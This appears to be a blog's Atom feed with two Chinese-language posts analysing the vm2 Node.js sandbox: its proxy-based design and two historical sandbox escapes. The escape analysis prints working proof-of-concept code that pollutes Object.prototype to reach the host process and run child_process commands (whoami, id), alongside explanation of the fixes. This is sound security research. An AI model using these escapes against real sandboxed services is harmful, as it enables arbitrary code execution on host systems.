<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.me/"/>
  <updated>2020-07-01T06:36:07.041Z</updated>
  <id>https://prontosil.me/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vm2沙箱逃逸分析</title>
    <link href="https://prontosil.me/posts/9c09dcd4/"/>
    <id>https://prontosil.me/posts/9c09dcd4/</id>
    <published>2020-06-06T07:10:33.000Z</published>
    <updated>2020-07-01T06:36:07.041Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207291</a></p><h1 id="vm2沙箱逃逸分析"><a href="#vm2沙箱逃逸分析" class="headerlink" title="vm2沙箱逃逸分析"></a>vm2沙箱逃逸分析</h1><p>前言：vm2中在版本的更迭中，存在多种逃逸方法，可以参考 <a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a> 但是 issue中都没有给出具体的分析，本文通过几个典型的案例来分析这些代码是如何逃逸出vm2的</p><blockquote><p>注：需要使用git进行回退 <code>git reset --hard 7ecabb1</code></p></blockquote><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看这个案例前，首先需要补充一点es6 proxy的知识 <a href="https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy" target="_blank" rel="noopener">https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy</a> (大神可以略过)</p><p>先看一段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">    <span class="keyword">get</span> () &#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"get"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(target, handler);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">Object</span>.prototype.has = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"has"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  proxy.a; <span class="comment">//触发get</span></span><br><span class="line">  <span class="string">""</span> <span class="keyword">in</span> proxy; <span class="comment">//触发has，这个has是在原型链上定义的</span></span><br></pre></td></tr></table></figure><p>在对象 <code>target</code> 上定义了 <code>get</code> 操作，会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get</code></p><p>但是当执行 <code>&quot;&quot; in proxy</code> 时，也会被 <code>has</code>方法拦截，此时，我们虽然没有直接在 <code>target</code> 对象上定义 <code>has</code> 拦截操作，即代理的方法是可以被继承的。</p><p>回到vm2逃逸的代码，vm2中实际运行的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.has = <span class="function"><span class="keyword">function</span> (<span class="params">t, k</span>) </span>&#123;</span><br><span class="line">    process = t.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="string">""</span> <span class="keyword">in</span> Buffer.from;</span><br><span class="line">process.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString()</span><br></pre></td></tr></table></figure><p><code>Buffer.from</code> 是一个代理对象，vm2的作者一开始并没有给vm2内部的Object 加上 has方法，所以我们可以自己给 <code>Object</code> 对象的原型上添加 <code>has</code> 方法，这时候运行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span> <span class="keyword">in</span> Buffer.from;</span><br></pre></td></tr></table></figure><p>就会去执行我们定义好的has方法，由于 <code>proxy</code> 的机制，参数 <code>t</code> 是 <code>function Buffer.from</code> ，这个function是在外部的，其上下文是 nodejs 的global下，所以访问其 <code>constructor</code> 属性就获取到了外部的 <code>Function</code>，从而拿到外部的 <code>process</code></p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/image-20200531101107708.png" alt></p><p>而开发者的修复方案：添加上 has 方法</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1590891160012.png" alt></p><p>可以看到，没有修复之前，<code>Buffer.from</code> 是没有拦截 <code>has</code> 操作的</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1590891167907.png" alt></p><p>而修复之后：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard.png" alt></p><p>由于 <code>Buffer.from</code> 中已经存在了 has 方法，所以不会去原型链上查找</p><h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样地，需要补充一点js的知识：</p><p>js的对象中，存在三种不同的属性：数据属性，访问器属性和内部属性。我们只看数据属性和访问器属性</p><p>数据属性和访问器属性都存在 <code>[[Enumerable]]</code> 和 <code>[[Configurable]]</code> 特性</p><p>不同点：以下特性属于数据属性：</p><ul><li><code>[[Value]]</code>：该属性的属性值，默认为<code>undefined</code>。</li><li><code>[[Writable]]</code>：是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code>。</li></ul><p>以下特性属于访问器属性</p><ul><li><p><code>[[Get]]</code>：是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code></p></li><li><p><code>[[Set]]</code>：是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    prop: <span class="keyword">let</span> obj = &#123;</span><br><span class="line">    prop:<span class="number">123</span>,</span><br><span class="line">    Writable: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> jbo = &#123;</span><br><span class="line">    <span class="keyword">get</span> prop()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span> prop(val)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"set"</span>+val);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj.prop); <span class="comment">//123</span></span><br><span class="line"><span class="built_in">console</span>.log(jbo.prop); <span class="comment">//get</span></span><br></pre></td></tr></table></figure><p>我们也可以通过 <code>Object.defineProperty</code> 来设置对象的访问器属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(obj.prop);</span><br></pre></td></tr></table></figure><p>我们还可以这样写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"get1"</span>); <span class="comment">//get1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> <span class="string">"get2"</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(obj.prop); <span class="comment">//get2</span></span><br></pre></td></tr></table></figure><p>在这种情况下，会先执行 <code>get()</code> 函数，打印 <code>get1</code>，返回一个函数，作为 <code>prop</code> 属性的 getter，之后访问 <code>obj.prop</code> 时，就会打印 <code>get2</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>()&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">"get1"</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> <span class="string">"get2"</span>&#125;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>同理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="keyword">set</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"set1"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="function">(<span class="params">val</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="string">"set2"</span>)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.prop = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>此时会先执行一次 <code>set()</code> 函数打印出 <code>set1</code>，同时设置 <code>prop</code> 属性的 setter 为 <code>(val)=&gt;{console.log(&quot;set2&quot;)}</code> 之后执行 <code>obj.prop  = 1</code> 时，就会打印 <code>set2</code>;</p><p>那么回过头来看vm2逃逸的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> a = Buffer.from(<span class="string">""</span>)</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(a, <span class="string">""</span>, &#123;</span><br><span class="line">        <span class="keyword">get</span> <span class="keyword">set</span>() &#123;</span><br><span class="line">            <span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">"get"</span>, &#123;</span><br><span class="line">                <span class="keyword">get</span>: function <span class="keyword">get</span>() &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> x.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    process = e(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的过程如下：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/vm2-Page-6.png" alt></p><p>参考前文 vm2 实现原理分析，此时得到的a是一个代理对象，当我们在a上定义新属性的时候，被代理的 <code>defineProperty</code> 拦截</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427976885.png" alt></p><p>检测传入的 <code>descriptor</code> 上是否设置了 get和set，如果是，调用外部的 <code>host.Object.defineProperty</code> 去实现设置对象属性的</p><p>但是在执行 <code>descriptor.get</code> 的时候，由于 <code>nodejs</code>是异步的，此时已经执行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">"get"</span>, &#123;</span><br><span class="line">                <span class="keyword">get</span>: function <span class="keyword">get</span>() &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> x.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure><p>也就是说，<code>descriptor.get</code> 会沿着原型链寻找到 <code>get</code>, 并且抛出异常，<code>throw x=&gt;x.constructor(&quot;return process&quot;)();</code></p><p>这个抛出的异常，最先被vm2内部捕获到，就是图中的e</p><p>vm2 需要将其包装成一个代理对象之后，继续抛出，所以这个异常被我们写的代码捕获到</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427979718.png" alt></p><p>vm2抛出的异常，被我们的代码捕获到</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427981854.png" alt></p><p>然后我们将其作为函数来调用，那就会触发这个函数代理对象的 <code>apply</code> 方法</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427984587.png" alt></p><p>这里的 <code>target</code> 就是 <code>x=&gt;x.constructor(&#39;return process&#39;)()</code></p><p><code>context</code> 是函数的上下文代理，通过 <code>Decontextify.value</code> 之后是 <code>underfined</code></p><p><code>args</code> 是函数的参数代理，其值为 <code>() =&gt; {}</code></p><p>真正的函数调用发生在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Contextify.value(fnc.apply(context, Decontextify.arguments(args)));</span><br></pre></td></tr></table></figure><p>这里可以做一下拆分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> func_arg = Decontextify.arguments(args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fnc_result = fnc.apply(context, func_arg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = Contextify.value(fnc_result);</span><br></pre></td></tr></table></figure><p>逻辑上看，先将函数的参数做一次处理，然后通过反射调用函数，再将得到的结果包装成代理</p><p>问题出在对函数的参数处理上，此处的函数参数为 <code>() =&gt; {}</code> ，是一个函数，并不是代理对象</p><p>所以 <code>Decontextify</code> 将其做了一次包装，使之成为一个代理对象</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427987679.png" alt></p><p>然而问题在于，这个函数的代理对象中的get方法的实现</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427990942.png" alt></p><p>当访问 <code>constructor</code> 属性的时候，得到的是 <code>host.Function</code></p><p>如图：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427993085.png" alt></p><p>这就导致逃溢出沙箱了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于安全客 &lt;a href=&quot;https://www.anquanke.com/post/id/207291&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/207291&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://prontosil.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="vm2" scheme="https://prontosil.me/tags/vm2/"/>
    
      <category term="沙箱逃逸" scheme="https://prontosil.me/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>vm2实现原理分析</title>
    <link href="https://prontosil.me/posts/3f069ae5/"/>
    <id>https://prontosil.me/posts/3f069ae5/</id>
    <published>2020-06-06T07:10:06.000Z</published>
    <updated>2020-07-08T11:15:29.695Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/207283" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207283</a></p><h1 id="vm2实现原理分析"><a href="#vm2实现原理分析" class="headerlink" title="vm2实现原理分析"></a>vm2实现原理分析</h1><p>前言：vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问，那么这个沙箱是否安全呢？本文针对vm2的实现原理，从源码的层面进行分析，看vm2究竟做了些什么。</p><h2 id="vm-API"><a href="#vm-API" class="headerlink" title="vm API"></a>vm API</h2><p>vm2是在vm的基础上实现的沙箱，所以内部调用的还是vm的API，在vm中运行一个沙箱环境：</p><p>![](vm2实现原理分析/Sun, 31 May 2020 092059-1591428069572.png)</p><p>相应的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">  animal: <span class="string">'cat'</span>,</span><br><span class="line">  count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">'count += 1; name = "kitty";'</span>); <span class="comment">//编译code</span></span><br><span class="line"></span><br><span class="line">vm.createContext(context); <span class="comment">// 创建一个上下文隔离对象</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">  script.runInContext(context); <span class="comment">// 在指定的下文里执行code并返回其结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(context);</span><br><span class="line"><span class="comment">// 打印: &#123; animal: 'cat', count: 12, name: 'kitty' &#125;</span></span><br></pre></td></tr></table></figure><p>将代码编译为 <code>script</code>，然后创建一个上下文 <code>vm.createContext(context)</code> ，最后我们将编译好的脚本放在一个上下文中运行 <code>script.runInContext</code></p><p>当然也可以不用那么麻烦，直接在沙箱中运行一段代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(vm.runInNewContext(<span class="string">"let a = 2;a"</span>)); <span class="comment">//2</span></span><br></pre></td></tr></table></figure><p>如果不提供上下文变量，那么vm会自己创建一个隔离的上下文context。</p><p>显而易见，vm中最关键的就是 上下文<code>context</code> ，vm能逃逸出来的原理也就是因为 <code>context</code> 并没有拦截针对外部的 <code>constructor</code> 和 <code>__proto__</code>等属性 的访问</p><h2 id="vm2-API"><a href="#vm2-API" class="headerlink" title="vm2 API"></a>vm2 API</h2><p><code>vm2</code>的代码包中主要有四个文件 <code>cli.js</code>,<code>contextify.js</code>,<code>main.js</code> 和 <code>sandbox.js</code></p><ul><li><code>cli.js</code> 实现vm2的命令行调用</li><li><code>contextify.js</code> 封装了三个对象， <code>Contextify</code> 和 <code>Decontextify</code> ，并且针对 global 的Buffer类进行了代理</li><li><code>main.js</code> vm2执行的入口，导出了 <code>NodeVM</code>, <code>VM</code> 这两个沙箱环境，还有一个 <code>VMScript</code> 实际上是封装了 <code>vm.Script</code></li><li><code>sadbox.js</code>针对 <code>global</code> 的一些函数和变量进行了hook，比如 <code>setTimeout</code>，<code>setInterval</code> 等</li></ul><p>vm2相比vm做了很大的改进，其中之一就是利用了es6新增的 proxy 特性，从而拦截对诸如 <code>constructor</code> 和 <code>__proto__</code> 这些属性的访问</p><p>在vm2 中运行一段代码，如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM, VMScript&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> VMScript(<span class="string">"let a = 2;a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log((<span class="keyword">new</span> VM()).run(script));</span><br></pre></td></tr></table></figure><p>其中 VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 <code>run</code> 方法即可运行一段脚本。</p><h2 id="vm2运行原理"><a href="#vm2运行原理" class="headerlink" title="vm2运行原理"></a>vm2运行原理</h2><p>vm2在运行代码的时候，会做如下事情，我们将上文的代码拆分开来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM, VMScript&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> VMScript(<span class="string">"let a = 2;a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> VM();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(vm.run(script));</span><br></pre></td></tr></table></figure><p>运行的代码和vm2对应的实现：</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/vm2-Page-2-1591428075172.png" alt></p><p>当我们创建一个VM的对象的时候，vm2内部引入了 <code>contextify.js</code>，并且针对上下文 <code>context</code> 进行了封装，最后调用 <code>script.runInContext(context)</code> ，可以看到，vm2最核心的操作就在于针对<code>context</code>的封装。</p><h2 id="vm2-是如何封装上下文的"><a href="#vm2-是如何封装上下文的" class="headerlink" title="vm2 是如何封装上下文的"></a>vm2 是如何封装上下文的</h2><blockquote><p>注：由于vm2出现过多次逃逸的问题，所以现有的代码进行了大量的修改，为了方便分析vm2的实现原理，需要clone源码并且回退到 7ecabb1   使用 <code>git reset --hard 7ecabb1</code> 即可回退</p></blockquote><p>我们看到，vm2 引入了 <code>contextify.js</code> ，将 <code>vm.createContext</code>创建的上下文作为参数传入。</p><p>其中引入 <code>contextify.js</code> 的代码比较独特，是调用vm的API将 <code>contextify.js</code> 封装为一个匿名函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_internal'</span>, &#123;</span><br><span class="line">value: vm.runInContext(<span class="string">`(function(require, host) &#123; <span class="subst">$&#123;cf&#125;</span> \n&#125;)`</span>, <span class="keyword">this</span>._context, &#123;</span><br><span class="line">filename: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/contextify.js`</span>,</span><br><span class="line">displayErrors: <span class="literal">false</span></span><br><span class="line">&#125;).call(<span class="keyword">this</span>._context, <span class="built_in">require</span>, host)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p> <code>host</code> 传入需要用的一些对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> host=&#123;<span class="attr">version</span>:<span class="built_in">parseInt</span>(process.versions.node.split(<span class="string">'.'</span>)[<span class="number">0</span>]),<span class="built_in">console</span>,<span class="built_in">String</span>,<span class="built_in">Number</span>,Buffer,<span class="built_in">Boolean</span>,<span class="built_in">Array</span>,<span class="built_in">Date</span>,<span class="built_in">Error</span>,<span class="built_in">RangeError</span>,<span class="built_in">ReferenceError</span>,<span 